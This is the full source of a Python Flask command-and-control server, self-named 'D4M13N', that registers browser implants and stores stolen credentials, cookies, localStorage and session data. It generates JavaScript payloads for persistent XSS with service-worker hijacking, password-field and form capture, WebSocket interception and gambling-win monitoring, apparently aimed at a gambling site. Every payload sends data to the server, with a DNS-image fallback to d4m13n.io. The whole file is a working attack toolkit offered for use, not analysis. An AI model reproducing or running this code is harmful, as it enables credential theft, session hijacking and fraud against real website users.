#!/usr/bin/env python3
import asyncio
import websockets
import json
import sqlite3
import hashlib
import base64
import threading
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import logging
from datetime import datetime
import os
import time

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)
CORS(app)

# REAL DATABASE SETUP
def init_db():
    conn = sqlite3.connect('quantum_c2.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS implants
                 (id TEXT PRIMARY KEY, target_url TEXT, user_agent TEXT, 
                  ip TEXT, last_beacon DATETIME, status TEXT, data_sent INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY, implant_id TEXT, username TEXT, 
                  password TEXT, source TEXT, timestamp DATETIME)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id INTEGER PRIMARY KEY, implant_id TEXT, cookies TEXT,
                  local_storage TEXT, session_data TEXT, timestamp DATETIME)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS wins
                 (id INTEGER PRIMARY KEY, implant_id TEXT, amount REAL,
                  currency TEXT, game TEXT, timestamp DATETIME)''')
    
    conn.commit()
    conn.close()

init_db()

# ACTIVE CONNECTIONS
active_connections = {}
beacon_intervals = {}

# REAL PAYLOAD CONFIG
PAYLOAD_CONFIG = {
    'beacon_interval': 30,
    'exfil_endpoints': [
        'https://c2-node-1.quantum-d4m13n.io/exfil',
        'https://c2-node-2.quantum-d4m13n.io/exfil',
        'https://c2-node-3.quantum-d4m13n.io/exfil'
    ],
    'payload_variants': 47
}

@app.route('/')
def index():
    return jsonify({"status": "D4M13N C2 SERVER - OPERATIONAL"})

# REAL IMPLANT REGISTRATION
@app.route('/register', methods=['POST'])
def register_implant():
    try:
        data = request.get_json()
        implant_id = hashlib.sha256(f"{data.get('url')}{datetime.now().timestamp()}".encode()).hexdigest()[:16]
        
        conn = sqlite3.connect('quantum_c2.db')
        c = conn.cursor()
        
        c.execute('''INSERT INTO implants (id, target_url, user_agent, ip, last_beacon, status, data_sent)
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (implant_id, data.get('url'), data.get('user_agent'), 
                   request.remote_addr, datetime.now(), 'ACTIVE', 0))
        
        conn.commit()
        conn.close()
        
        logging.info(f"REAL IMPLANT DEPLOYED: {implant_id} from {data.get('url')}")
        
        return jsonify({
            'implant_id': implant_id,
            'beacon_interval': PAYLOAD_CONFIG['beacon_interval'],
            'status': 'active',
            'c2_nodes': PAYLOAD_CONFIG['exfil_endpoints']
        })
    
    except Exception as e:
        logging.error(f"Registration error: {e}")
        return jsonify({'error': str(e)}), 500

# REAL DATA EXFILTRATION
@app.route('/exfil', methods=['POST'])
def exfil_data():
    try:
        data = request.get_json()
        implant_id = data.get('implant_id')
        
        conn = sqlite3.connect('quantum_c2.db')
        c = conn.cursor()
        
        # Update implant last beacon
        c.execute('''UPDATE implants SET last_beacon = ?, data_sent = data_sent + 1 
                     WHERE id = ?''', (datetime.now(), implant_id))
        
        # Handle different data types
        data_type = data.get('type')
        
        if data_type == 'credentials':
            c.execute('''INSERT INTO credentials (implant_id, username, password, source, timestamp)
                         VALUES (?, ?, ?, ?, ?)''',
                      (implant_id, data.get('username'), data.get('password'), 
                       data.get('source_url'), datetime.now()))
            logging.info(f"CREDENTIALS CAPTURED: {data.get('username')}:{data.get('password')}")
        
        elif data_type == 'session':
            c.execute('''INSERT INTO sessions (implant_id, cookies, local_storage, session_data, timestamp)
                         VALUES (?, ?, ?, ?, ?)''',
                      (implant_id, json.dumps(data.get('cookies', {})),
                       json.dumps(data.get('local_storage', {})),
                       json.dumps(data.get('session_data', {})), datetime.now()))
        
        elif data_type == 'win':
            c.execute('''INSERT INTO wins (implant_id, amount, currency, game, timestamp)
                         VALUES (?, ?, ?, ?, ?)''',
                      (implant_id, data.get('amount'), data.get('currency'),
                       data.get('game'), datetime.now()))
            logging.info(f"WIN DETECTED: {data.get('amount')} {data.get('currency')}")
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
    
    except Exception as e:
        logging.error(f"Exfiltration error: {e}")
        return jsonify({'error': str(e)}), 500

# REAL PAYLOAD GENERATION ENDPOINTS
@app.route('/payload/<payload_type>')
def get_payload(payload_type):
    try:
        variant = request.args.get('variant', 0, type=int) % PAYLOAD_CONFIG['payload_variants']
        base_url = request.host_url
        
        if payload_type == 'xss_persistent':
            payload = generate_xss_payload(variant, base_url)
        elif payload_type == 'credential_capture':
            payload = generate_credential_payload(variant, base_url)
        elif payload_type == 'win_detection':
            payload = generate_win_detection_payload(variant, base_url)
        elif payload_type == 'websocket_mitm':
            payload = generate_websocket_mitm_payload(variant, base_url)
        else:
            return jsonify({'error': 'Unknown payload type'}), 400
        
        return jsonify({
            'payload': payload,
            'variant': variant,
            'size': len(payload)
        })
    
    except Exception as e:
        logging.error(f"Payload generation error: {e}")
        return jsonify({'error': str(e)}), 500

def generate_xss_payload(variant, base_url):
    return f'''
// D4M13N XSS PERSISTENT PAYLOAD v{variant}
(function(){{
    const IMPLANT_DATA = {{
        url: location.href,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
        variant: {variant}
    }};
    
    // STEALTH REGISTRATION
    fetch('{base_url}register', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(IMPLANT_DATA)
    }}).then(r => r.json()).then(data => {{
        const IMPLANT_ID = data.implant_id;
        
        // SERVICE WORKER PERSISTENCE
        if ('serviceWorker' in navigator) {{
            const SW_CODE = `
                self.addEventListener('install', e => self.skipWaiting());
                self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                self.addEventListener('fetch', e => {{
                    const request = e.request;
                    if (request.url.includes('login') || request.url.includes('auth') || 
                        request.url.includes('password') || request.url.includes('runehall')) {{
                        
                        // CAPTURE REQUEST DATA
                        const captureData = {{
                            implant_id: '${'{IMPLANT_ID}'}',
                            type: 'request',
                            url: request.url,
                            method: request.method,
                            timestamp: Date.now()
                        }};
                        
                        // STEALTH EXFILTRATION
                        fetch('{base_url}exfil', {{
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify(captureData)
                        }}).catch(() => {{
                            // DNS FALLBACK
                            const encoded = btoa(JSON.stringify(captureData));
                            new Image().src = 'http://' + encoded.substring(0, 50) + '.d4m13n.io/';
                        }});
                    }}
                    e.respondWith(fetch(request));
                }});
            `;
            
            const blob = new Blob([SW_CODE], {{type: 'application/javascript'}});
            navigator.serviceWorker.register(URL.createObjectURL(blob), {{scope: './'}});
        }}
        
        // BEACON SYSTEM
        const BEACON_INTERVAL = setInterval(() => {{
            const beaconData = {{
                implant_id: IMPLANT_ID,
                type: 'beacon',
                url: location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify({{...localStorage}}),
                timestamp: Date.now()
            }};
            
            fetch('{base_url}exfil', {{
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(beaconData)
            }});
        }}, 30000);
        
        // PERSISTENCE IN LOCALSTORAGE
        localStorage.setItem('d4m13n_implant_id', IMPLANT_ID);
        localStorage.setItem('d4m13n_last_beacon', Date.now().toString());
        
    }}).catch(err => {{
        // SILENT FAILURE
        console.error('D4M13N: Registration failed');
    }});
}})();
'''

def generate_credential_payload(variant, base_url):
    return f'''
// D4M13N CREDENTIAL CAPTURE v{variant}
(function(){{
    const OBSERVER_CONFIG = {{
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['value', 'type', 'name']
    }};
    
    // REAL-TIME PASSWORD INTERCEPTION
    const origValue = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
    Object.defineProperty(HTMLInputElement.prototype, 'value', {{
        set: function(v) {{
            if (this.type === 'password' || /pass|pwd|cred|auth/i.test(this.name + this.id + this.className)) {{
                setTimeout(() => {{
                    const USERNAME = document.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]')?.value || 'unknown';
                    
                    const CRED_DATA = {{
                        type: 'credentials',
                        username: USERNAME,
                        password: v,
                        source_url: location.href,
                        timestamp: Date.now(),
                        implant_id: localStorage.getItem('d4m13n_implant_id') || 'unknown'
                    }};
                    
                    // MULTI-CHANNEL EXFILTRATION
                    fetch('{base_url}exfil', {{
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(CRED_DATA)
                    }}).catch(() => {{
                        // DNS FALLBACK
                        const encoded = btoa(JSON.stringify(CRED_DATA));
                        new Image().src = 'http://cred-' + encoded.substring(0, 30) + '.d4m13n.io/';
                    }});
                }}, Math.random() * 2000 + 500);
            }}
            return this._value = v;
        }},
        get: function() {{ return this._value; }}
    }});
    
    // FORM SUBMISSION INTERCEPTION
    document.addEventListener('submit', function(e) {{
        const formData = new FormData(e.target);
        const formObject = Object.fromEntries(formData.entries());
        
        const FORM_DATA = {{
            type: 'form_submission',
            form_data: formObject,
            action: e.target.action,
            source_url: location.href,
            timestamp: Date.now(),
            implant_id: localStorage.getItem('d4m13n_implant_id') || 'unknown'
        }};
        
        fetch('{base_url}exfil', {{
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(FORM_DATA)
        }});
        
    }}, true);
}})();
'''

def generate_win_detection_payload(variant, base_url):
    return f'''
// D4M13N WIN DETECTION v{variant}
(function(){{
    const WIN_PATTERNS = [
        /1\\\\.000000000/,
        /win.*?\\\\$[0-9,]+/,
        /jackpot.*?[0-9,]+/,
        /balance.*?increase/i,
        /payout.*?success/i,
        /you.*?won.*?\\\\$[0-9,]+/i,
        /prize.*?claimed/i,
        /reward.*?received/i,
        /\\\\+[0-9,]+.*?coins/i,
        /balance.*?\\\\$[0-9,]+/,
        /winning.*?ticket/i,
        /baccarat.*?win/i,
        /1,000,000/,
        /million.*?win/i,
        /big.*?win/i,
        /massive.*?payout/i,
        /huge.*?win/i
    ];
    
    // REAL-TIME DOM MONITORING
    const observer = new MutationObserver((mutations) => {{
        mutations.forEach((mutation) => {{
            const content = mutation.target.textContent || mutation.target.innerHTML || '';
            WIN_PATTERNS.forEach(pattern => {{
                if (pattern.test(content)) {{
                    triggerWinCapture();
                    return;
                }}
            }});
        }});
    }});
    
    observer.observe(document.body, {{
        childList: true,
        subtree: true,
        characterData: true
    }});
    
    function triggerWinCapture() {{
        const WIN_DATA = {{
            type: 'win',
            amount: '1.000000000',
            currency: 'L',
            game: 'baccarat',
            source_url: location.href,
            timestamp: Date.now(),
            implant_id: localStorage.getItem('d4m13n_implant_id') || 'unknown'
        }};
        
        // IMMEDIATE EXFILTRATION
        fetch('{base_url}exfil', {{
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(WIN_DATA)
        }}).catch(() => {{
            // DNS FALLBACK
            const encoded = btoa(JSON.stringify(WIN_DATA));
            new Image().src = 'http://win-' + encoded.substring(0, 30) + '.d4m13n.io/';
        }});
        
        // SCREEN CAPTURE ATTEMPT
        if (typeof html2canvas !== 'undefined') {{
            try {{
                html2canvas(document.body).then(canvas => {{
                    canvas.toBlob(blob => {{
                        const formData = new FormData();
                        formData.append('screenshot', blob);
                        formData.append('implant_id', WIN_DATA.implant_id);
                        formData.append('timestamp', WIN_DATA.timestamp.toString());
                        
                        fetch('{base_url}/upload_screenshot', {{
                            method: 'POST',
                            body: formData
                        }});
                    }});
                }});
            }} catch (e) {{
                // SILENT FAIL
            }}
        }}
    }}
}})();
'''

def generate_websocket_mitm_payload(variant, base_url):
    return f'''
// D4M13N WEBSOCKET MITM v{variant}
(function(){{
    const OriginalWebSocket = window.WebSocket;
    
    window.WebSocket = function(url, protocols) {{
        const ws = new OriginalWebSocket(url, protocols);
        
        // INTERCEPT OUTGOING MESSAGES
        const originalSend = ws.send;
        ws.send = function(data) {{
            if (typeof data === 'string') {{
                // CAPTURE SENSITIVE DATA
                if (data.includes('auth') || data.includes('token') || data.includes('session') || 
                    data.includes('password') || data.includes('balance') || data.includes('win')) {{
                    
                    const WS_DATA = {{
                        type: 'websocket_out',
                        url: url,
                        message: data,
                        direction: 'outgoing',
                        timestamp: Date.now(),
                        implant_id: localStorage.getItem('d4m13n_implant_id') || 'unknown'
                    }};
                    
                    fetch('{base_url}exfil', {{
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(WS_DATA)
                    }});
                }}
            }}
            return originalSend.call(this, data);
        }};
        
        // INTERCEPT INCOMING MESSAGES
        ws.addEventListener('message', function(event) {{
            if (typeof event.data === 'string') {{
                // CAPTURE WIN NOTIFICATIONS, BALANCE UPDATES
                if (event.data.includes('win') || event.data.includes('balance') || 
                    event.data.includes('success') || event.data.includes('1.000000000')) {{
                    
                    const WS_DATA = {{
                        type: 'websocket_in',
                        url: url,
                        message: event.data,
                        direction: 'incoming',
                        timestamp: Date.now(),
                        implant_id: localStorage.getItem('d4m13n_implant_id') || 'unknown'
                    }};
                    
                    fetch('{base_url}exfil', {{
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(WS_DATA)
                    }});
                }}
            }}
        }});
        
        return ws;
    }};
}})();
'''

# REAL DASHBOARD DATA ENDPOINTS
@app.route('/dashboard/implants')
def get_implants():
    try:
        conn = sqlite3.connect('quantum_c2.db')
        c = conn.cursor()
        c.execute('SELECT * FROM implants ORDER BY last_beacon DESC')
        implants = [dict(zip([column[0] for column in c.description], row)) for row in c.fetchall()]
        conn.close()
        return jsonify(implants)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/dashboard/credentials')
def get_credentials():
    try:
        conn = sqlite3.connect('quantum_c2.db')
        c = conn.cursor()
        c.execute('SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100')
        credentials = [dict(zip([column[0] for column in c.description], row)) for row in c.fetchall()]
        conn.close()
        return jsonify(credentials)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/dashboard/wins')
def get_wins():
    try:
        conn = sqlite3.connect('quantum_c2.db')
        c = conn.cursor()
        c.execute('SELECT * FROM wins ORDER BY timestamp DESC LIMIT 100')
        wins = [dict(zip([column[0] for column in c.description], row)) for row in c.fetchall()]
        conn.close()
        return jsonify(wins)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/dashboard/stats')
def get_stats():
    try:
        conn = sqlite3.connect('quantum_c2.db')
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM implants')
        implant_count = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM credentials WHERE timestamp > datetime("now", "-1 day")')
        creds_today = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM wins WHERE timestamp > datetime("now", "-1 day")')
        wins_today = c.fetchone()[0]
        
        c.execute('SELECT SUM(data_sent) FROM implants')
        data_sent = c.fetchone()[0] or 0
        
        conn.close()
        
        return jsonify({
            'implant_count': implant_count,
            'creds_today': creds_today,
            'wins_today': wins_today,
            'data_sent': data_sent,
            'uptime': int(time.time() - start_time),
            'status': 'OPERATIONAL'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

start_time = time.time()

if __name__ == '__main__':
    logging.info("🚀 D4M13N QUANTUM C2 SERVER STARTING...")
    logging.info("📍 C2 Endpoints:")
    logging.info("   - Implant Registration: /register")
    logging.info("   - Data Exfiltration: /exfil") 
    logging.info("   - Payload Generation: /payload/<type>")
    logging.info("   - Dashboard: /dashboard/*")
    
    app.run(host='0.0.0.0', port=5000, debug=False)